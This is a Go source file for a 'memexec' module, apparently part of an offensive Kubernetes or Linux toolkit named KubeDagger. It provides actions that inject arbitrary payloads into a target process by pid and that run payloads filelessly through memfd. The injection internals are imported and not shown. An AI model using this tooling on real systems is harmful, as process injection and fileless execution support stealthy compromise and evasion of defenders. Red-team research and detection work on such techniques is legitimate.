package modules

import (
	"context"
	"fmt"
	"strconv"
	"strings"

	"github.com/yasindce1998/KubeDagger/pkg/memexec"
)

type MemExec struct{}

func (m *MemExec) Name() string      { return "memexec" }
func (m *MemExec) Platform() []string { return []string{"linux"} }

func (m *MemExec) Execute(ctx context.Context, args map[string]string) (*Result, error) {
	action := args["action"]
	if action == "" {
		action = "status"
	}

	switch action {
	case "inject":
		return m.inject(args)
	case "memfd":
		return m.memfd(args)
	case "status":
		return m.status()
	default:
		return nil, fmt.Errorf("unknown action: %s (valid: inject, memfd, status)", action)
	}
}

func (m *MemExec) inject(args map[string]string) (*Result, error) {
	method := args["method"]
	if method == "" {
		method = "procmem"
	}

	pidStr := args["pid"]
	if pidStr == "" {
		return nil, fmt.Errorf("inject requires pid argument")
	}

	pid, err := strconv.Atoi(pidStr)
	if err != nil {
		return nil, fmt.Errorf("invalid pid: %w", err)
	}

	payload := []byte(args["payload"])
	if len(payload) == 0 {
		return nil, fmt.Errorf("inject requires payload argument")
	}

	injector := memexec.NewInjector(memexec.Method(method))
	if err := injector.Inject(pid, payload); err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("injection failed: %v", err),
		}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("injected %d bytes into pid %d via %s", len(payload), pid, method),
	}, nil
}

func (m *MemExec) memfd(args map[string]string) (*Result, error) {
	payload := []byte(args["payload"])
	if len(payload) == 0 {
		return nil, fmt.Errorf("memfd requires payload argument")
	}

	argv := strings.Fields(args["argv"])

	injector := memexec.NewInjector(memexec.MethodMemFD)
	pid, err := injector.ExecuteMemfd(payload, argv)
	if err != nil {
		return &Result{
			Success: false,
			Error:   fmt.Sprintf("memfd exec failed: %v", err),
		}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("executed via memfd, child pid: %d", pid),
	}, nil
}

func (m *MemExec) status() (*Result, error) {
	methods := memexec.AvailableMethods()
	var names []string
	for _, method := range methods {
		names = append(names, string(method))
	}

	if len(names) == 0 {
		return &Result{
			Success: false,
			Output:  "no injection methods available (not linux)",
		}, nil
	}

	return &Result{
		Success: true,
		Output:  fmt.Sprintf("available methods: %s", strings.Join(names, ", ")),
	}, nil
}
